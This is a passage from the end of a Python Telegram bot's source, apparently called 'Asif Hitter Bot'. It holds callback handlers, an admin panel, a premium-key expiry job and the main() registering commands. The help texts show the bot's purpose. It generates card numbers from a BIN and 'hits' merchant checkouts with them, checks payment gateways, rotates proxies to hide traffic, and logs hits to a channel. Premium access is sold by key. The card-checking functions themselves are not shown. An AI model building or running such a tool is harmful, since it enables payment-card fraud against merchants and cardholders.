    d = q.data
    
    if d == "gate_help":
        await q.message.reply_text(f"{ae('🌐')} *Gateway Check*\n\n{ae('ℹ️')} Usage: `/gate <url>`\nChecks merchant & amount info.", parse_mode=ParseMode.MARKDOWN)
    elif d == "hit_help":
        await q.message.reply_text(f"{ae('💳')} *Hit Checkout*\n\n{ae('👑')} Premium only!\n{ae('ℹ️')} Usage: `/hit <url> <bin>`\nGenerates 10 cards & checks.", parse_mode=ParseMode.MARKDOWN)
    elif d == "redeem_help":
        await q.message.reply_text(f"{ae('🔑')} *Redeem Key*\n\n{ae('ℹ️')} Usage: `/auth <key>`\nActivate premium access.", parse_mode=ParseMode.MARKDOWN)
    elif d == "status":
        await cmd_status(update, ctx)
    elif d == "proxy_menu":
        await q.message.reply_text(
            f"{ae('🔐')} *PROXY MANAGER*\n\n"
            f"{ae('📌')} /addproxy — Add proxies\n"
            f"{ae('🔍')} /proxy — Check proxies\n"
            f"{ae('🗑')} /rmproxy — Remove proxies\n\n"
            f"{ae('ℹ️')} Max: *{MAX_PROXIES_PER_USER}* proxies",
            parse_mode=ParseMode.MARKDOWN
        )
    elif d == "admin" and is_admin(uid):
        kb = [
            [InlineKeyboardButton(f"{ae('🔑')} Gen Keys", callback_data="genkey_menu")],
            [InlineKeyboardButton(f"{ae('👥')} Premium Users", callback_data="prem_list")],
            [InlineKeyboardButton(f"{ae('📢')} Broadcast Help", callback_data="bcast_help")],
        ]
        await q.message.reply_text(f"{ae('⚡')} *ADMIN PANEL*\n\n"
            f"{ae('🔑')} /genkey 10 7 PREMIUM\n"
            f"{ae('👥')} /premium — List users\n"
            f"{ae('🗑')} /rmsub <id> — Remove user\n"
            f"{ae('📢')} /broadcast <msg> — Send to all\n"
            f"{ae('📡')} /sethits @channel — Set log",
            parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(kb))

# ═══════════════ AUTO EXPIRE CHECKER ═══════════════

async def expire_checker(ctx: ContextTypes.DEFAULT_TYPE):
    pd = jload(PREMIUM_FILE, {"users": {}})
    expired = []
    for uid, u in pd.get("users", {}).items():
        try:
            if datetime.now() > datetime.fromisoformat(u.get("expiry","2000-01-01")):
                expired.append(uid)
        except: pass
    
    for uid in expired:
        del pd["users"][uid]
        try:
            await ctx.bot.send_message(
                int(uid),
                f"{ae('⛔')}{ae('⛔')}{ae('⛔')} *PREMIUM EXPIRED* {ae('⛔')}{ae('⛔')}{ae('⛔')}\n\n"
                f"{ae('⏱️')} Your premium access has ended.\n"
                f"{ae('🔑')} Get a new key to continue.\n"
                f"{ae('👤')} [{DEV_NAME}](https://t.me/{DEV_USERNAME})",
                parse_mode=ParseMode.MARKDOWN
            )
        except: pass
    
    if expired:
        jsave(PREMIUM_FILE, pd)
        if LOG_CHANNEL:
            try:
                await ctx.bot.send_message(LOG_CHANNEL, f"{ae('⏱️')} Expired: {len(expired)} users removed")
            except: pass

# ═══════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════

def main():
    print("Starting Asif Hitter Bot...")
    
    os.makedirs(DATA_DIR, exist_ok=True)
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Commands
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("addproxy", cmd_addproxy))
    app.add_handler(CommandHandler("proxy", cmd_proxy))
    app.add_handler(CommandHandler("rmproxy", cmd_rmproxy))
    app.add_handler(CommandHandler("gate", cmd_gate))
    app.add_handler(CommandHandler("hit", cmd_hit))
    app.add_handler(CommandHandler("auth", cmd_auth))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("genkey", cmd_genkey))
    app.add_handler(CommandHandler("premium", cmd_premium_users))
    app.add_handler(CommandHandler("rmsub", cmd_rmsub))
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    app.add_handler(CommandHandler("sethits", cmd_sethits))
    
    app.add_handler(CallbackQueryHandler(on_callback))
    
    # Auto expire check every 30 min
    app.job_queue.run_repeating(expire_checker, interval=1800, first=30)
    
    print("Bot running...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()